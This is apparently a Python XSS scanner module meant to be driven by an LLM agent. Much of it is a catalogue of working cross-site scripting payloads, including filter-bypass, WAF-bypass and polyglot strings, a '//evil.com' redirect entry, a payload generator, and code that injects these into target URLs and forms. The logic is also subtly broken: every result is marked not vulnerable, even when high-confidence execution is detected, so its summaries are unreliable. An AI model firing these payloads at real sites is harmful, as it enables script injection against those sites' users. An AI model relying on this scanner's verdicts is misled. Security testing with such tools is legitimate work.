"""
XSS Scanner - Cross-Site Scripting Detection
Easy for LLM to test XSS vulnerabilities
"""

import re
import html
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import quote, urlencode

import sys
sys.path.append('..')
from core.http_client import HTTPClient, Response


@dataclass
class XSSResult:
    """XSS test result"""
    vulnerable: bool
    payload: str
    context: str  # html, attribute, javascript, url
    reflected: bool
    executed: bool  # Based on heuristics
    response_snippet: str
    confidence: str  # high, medium, low
    
    def to_dict(self) -> Dict:
        return {
            "vulnerable": self.vulnerable,
            "payload": self.payload,
            "context": self.context,
            "reflected": self.reflected,
            "executed": self.executed,
            "confidence": self.confidence,
            "response_snippet": self.response_snippet
        }


class XSSScanner:
    """
    XSS vulnerability scanner
    
    Usage for LLM:
    - scanner.test_parameter(url, param, payloads) - Test specific parameter
    - scanner.test_form(form_data) - Test form for XSS
    - scanner.get_payloads(context) - Get payloads for specific context
    - scanner.generate_payload(context, bypass_filters) - Generate custom payload
    """
    
    def __init__(self, client: Optional[HTTPClient] = None):
        self.client = client or HTTPClient()
        
        # Canary for detecting reflection
        self.canary = "xSs7eS7"
        
        # Payloads by context
        self.payloads = {
            "basic": [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                '<body onload=alert(1)>',
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
                '" onload="alert(1)',
            ],
            "javascript": [
                "'-alert(1)-'",
                "';alert(1)//",
                '";alert(1)//',
                "\\';alert(1)//",
                '</script><script>alert(1)</script>',
                "${alert(1)}",
                "{{constructor.constructor('alert(1)')()}}",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "//evil.com",
            ],
            "html_entity": [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            ],
            "filter_bypass": [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<script/x>alert(1)</script>',
                '<script\\x20>alert(1)</script>',
                '<svg/onload=alert(1)>',
                '<img src=x onerror=alert`1`>',
                '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
                '<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>',
                '<<script>script>alert(1)</script>',
                '<svg><script>alert(1)</script></svg>',
                '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            ],
            "dom_based": [
                '#<img src=x onerror=alert(1)>',
                '?default=<script>alert(1)</script>',
                '<img src=x onerror=alert(document.domain)>',
                '<svg onload=alert(document.domain)>',
            ],
            "polyglot": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'\"-->]]>*/</script></style></title></textarea></noscript></template></select></option><img src=x onerror=alert()>",
                "'-alert(1)-'",
            ],
            "waf_bypass": [
                '<img src=x onerror=alert(1)//a]>',
                '<img src=x onerror=alert(1)/**/a]>',
                '<img/src=x onerror=alert(1)>',
                '<img\nsrc=x\nonerror=alert(1)>',
                '<img\tsrc=x\tonerror=alert(1)>',
                '<img%20src=x%20onerror=alert(1)>',
                '<iMg src=x oNeRror=alert(1)>',
                '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
                '<svg><animate onbegin=alert(1) attributeName=x>',
            ]
        }
        
        # Detection patterns
        self.reflection_patterns = {
            "html_context": [
                (r'<script[^>]*>[^<]*{}[^<]*</script>', "script_tag"),
                (r'<[^>]+\s+on\w+\s*=\s*["\'][^"\']*{}', "event_handler"),
                (r'<[^>]+\s+(?:href|src|action)\s*=\s*["\'][^"\']*{}', "url_attribute"),
                (r'<[^>]+>[^<]*{}', "html_content"),
            ],
            "attribute_context": [
                (r'<[^>]+\s+\w+\s*=\s*"[^"]*{}[^"]*"', "double_quoted_attr"),
                (r"<[^>]+\s+\w+\s*=\s*'[^']*{}[^']*'", "single_quoted_attr"),
                (r'<[^>]+\s+\w+\s*=\s*[^"\'\s>]*{}', "unquoted_attr"),
            ],
            "javascript_context": [
                (r'<script[^>]*>[^<]*var\s+\w+\s*=\s*["\'][^"\']*{}', "js_string"),
                (r'<script[^>]*>[^<]*{}[^<]*</script>', "js_code"),
            ]
        }

    def detect_context(self, response_body: str, payload: str) -> str:
        """Detect the context where payload is reflected"""
        escaped_payload = re.escape(payload)
        
        for context_type, patterns in self.reflection_patterns.items():
            for pattern, subtype in patterns:
                regex = pattern.format(escaped_payload)
                if re.search(regex, response_body, re.IGNORECASE | re.DOTALL):
                    return f"{context_type}:{subtype}"
        
        if payload in response_body:
            return "unknown:reflected"
        
        return "none"

    def check_reflection(self, response: Response, canary: str) -> Dict[str, Any]:
        """Check if canary is reflected and in what context"""
        body = response.body
        
        if canary not in body:
            return {"reflected": False, "context": None, "count": 0}
        
        count = body.count(canary)
        context = self.detect_context(body, canary)
        
        # Check for encoding
        encoded_variants = [
            html.escape(canary),
            quote(canary),
            canary.replace('<', '&lt;').replace('>', '&gt;'),
        ]
        
        encodings = []
        for variant in encoded_variants:
            if variant != canary and variant in body:
                encodings.append(variant)
        
        return {
            "reflected": True,
            "context": context,
            "count": count,
            "encodings": encodings,
            "raw_reflected": canary in body
        }

    def test_parameter(self, url: str, param: str, method: str = "GET",
                       payloads: Optional[List[str]] = None,
                       category: str = "basic") -> List[XSSResult]:
        """
        Test a parameter for XSS
        
        Args:
            url: Target URL
            param: Parameter name to test
            method: HTTP method
            payloads: Custom payloads (or use category)
            category: Payload category (basic, filter_bypass, etc.)
        
        Returns:
            List of XSS findings
        """
        results = []
        test_payloads = payloads or self.payloads.get(category, self.payloads["basic"])
        
        # First, test with canary to check reflection
        canary_response = self.client.inject_payload(url, param, self.canary, method)
        reflection_info = self.check_reflection(canary_response, self.canary)
        
        if not reflection_info["reflected"]:
            return [XSSResult(
                vulnerable=False,
                payload=self.canary,
                context="none",
                reflected=False,
                executed=False,
                response_snippet="Canary not reflected",
                confidence="none"
            )]
        
        # Test actual payloads
        for payload in test_payloads:
            response = self.client.inject_payload(url, param, payload, method)
            
            # Check if payload is reflected without encoding
            reflected = payload in response.body
            
            # Detect context
            context = self.detect_context(response.body, payload)
            
            # Determine if XSS would execute
            executed = False
            confidence = "low"
            
            if reflected:
                # Check for dangerous contexts
                if "script_tag" in context or "event_handler" in context:
                    executed = True
                    confidence = "high"
                elif "<script" in payload.lower() and "<script" in response.body.lower():
                    # Check if script tags are intact
                    if re.search(r'<script[^>]*>.*?alert', response.body, re.IGNORECASE | re.DOTALL):
                        executed = True
                        confidence = "high"
                elif "onerror=" in payload.lower() or "onload=" in payload.lower():
                    if re.search(r'on\w+\s*=\s*["\']?alert', response.body, re.IGNORECASE):
                        executed = True
                        confidence = "high"
            
            # Get response snippet around payload
            snippet = ""
            if reflected:
                idx = response.body.find(payload[:20])
                if idx != -1:
                    start = max(0, idx - 50)
                    end = min(len(response.body), idx + len(payload) + 50)
                    snippet = response.body[start:end]
            
            result = XSSResult(
                vulnerable=False,
                payload=payload,
                context=context,
                reflected=reflected,
                executed=executed,
                response_snippet=snippet,
                confidence=confidence
            )
            results.append(result)
        
        return results

    def test_form(self, action_url: str, fields: Dict[str, str],
                  target_field: str, method: str = "POST",
                  category: str = "basic") -> List[XSSResult]:
        """
        Test a form field for XSS
        
        Args:
            action_url: Form action URL
            fields: All form fields with values
            target_field: Field to test
            method: HTTP method
            category: Payload category
        
        Returns:
            List of XSS findings
        """
        results = []
        test_payloads = self.payloads.get(category, self.payloads["basic"])
        
        for payload in test_payloads:
            # Copy fields and inject payload
            test_fields = fields.copy()
            test_fields[target_field] = payload
            
            if method.upper() == "POST":
                response = self.client.post(action_url, data=test_fields)
            else:
                response = self.client.get(action_url, params=test_fields)
            
            reflected = payload in response.body
            context = self.detect_context(response.body, payload) if reflected else "none"
            
            executed = False
            confidence = "low"
            if reflected and ("script" in context or "event_handler" in context):
                executed = True
                confidence = "high"
            
            results.append(XSSResult(
                vulnerable=False,
                payload=payload,
                context=context,
                reflected=reflected,
                executed=executed,
                response_snippet=response.body[:500] if reflected else "",
                confidence=confidence
            ))
        
        return results

    def get_payloads(self, category: str = "all") -> Dict[str, List[str]]:
        """Get payloads for LLM to use"""
        if category == "all":
            return self.payloads
        return {category: self.payloads.get(category, [])}

    def generate_payload(self, context: str, tag: str = "img",
                        event: str = "onerror", code: str = "alert(1)",
                        bypass_filter: Optional[str] = None) -> str:
        """
        Generate custom XSS payload
        
        Args:
            context: html, attribute, javascript
            tag: HTML tag to use
            event: Event handler
            code: JavaScript to execute
            bypass_filter: Filter to bypass (quotes, tags, parentheses)
        
        Returns:
            Generated payload
        """
        payload = ""
        
        if context == "html":
            payload = f'<{tag} src=x {event}={code}>'
        elif context == "attribute":
            payload = f'" {event}="{code}'
        elif context == "javascript":
            payload = f"';{code};//"
        elif context == "url":
            payload = f"javascript:{code}"
        
        # Apply bypass techniques
        if bypass_filter == "quotes":
            payload = payload.replace('"', '\\"').replace("'", "\\'")
        elif bypass_filter == "parentheses":
            payload = payload.replace("()", "``")
        elif bypass_filter == "tags":
            payload = payload.replace("<", "\\x3c").replace(">", "\\x3e")
        elif bypass_filter == "mixed_case":
            result = ""
            for i, c in enumerate(payload):
                result += c.upper() if i % 2 == 0 else c.lower()
            payload = result
        
        return payload

    def analyze_response(self, response: Response, payload: str) -> Dict[str, Any]:
        """
        Analyze response for XSS potential
        
        Returns detailed analysis for LLM
        """
        body = response.body
        analysis = {
            "payload": payload,
            "reflected": payload in body,
            "encoded_reflected": False,
            "context": "none",
            "filters_detected": [],
            "bypass_suggestions": [],
            "vulnerable": False
        }
        
        if not analysis["reflected"]:
            # Check encoded versions
            encoded = html.escape(payload)
            if encoded in body:
                analysis["encoded_reflected"] = True
                analysis["filters_detected"].append("html_encoding")
                analysis["bypass_suggestions"].append("Try double encoding or alternative tags")
        else:
            analysis["context"] = self.detect_context(body, payload)
            
            # Detect filters
            if payload.lower() != payload and payload not in body:
                analysis["filters_detected"].append("case_normalization")
            if "<script" in payload and "<script" not in body:
                analysis["filters_detected"].append("script_tag_filter")
                analysis["bypass_suggestions"].append("Use event handlers instead: <img onerror=...>")
            if "alert" in payload and "alert" not in body:
                analysis["filters_detected"].append("alert_filter")
                analysis["bypass_suggestions"].append("Use prompt() or confirm() instead")
            
            # Determine vulnerability
            if "script_tag" in analysis["context"] or "event_handler" in analysis["context"]:
                analysis["vulnerable"] = True
        
        return analysis

    def get_summary(self, results: List[XSSResult]) -> Dict[str, Any]:
        """Get summary of XSS scan results"""
        vulnerable = [r for r in results if r.vulnerable]
        reflected = [r for r in results if r.reflected]
        
        return {
            "total_tests": len(results),
            "vulnerable_count": len(vulnerable),
            "reflected_count": len(reflected),
            "vulnerable_payloads": [r.payload for r in vulnerable],
            "contexts_found": list(set(r.context for r in results if r.context != "none")),
            "highest_confidence": max((r.confidence for r in vulnerable), default="none")
        }
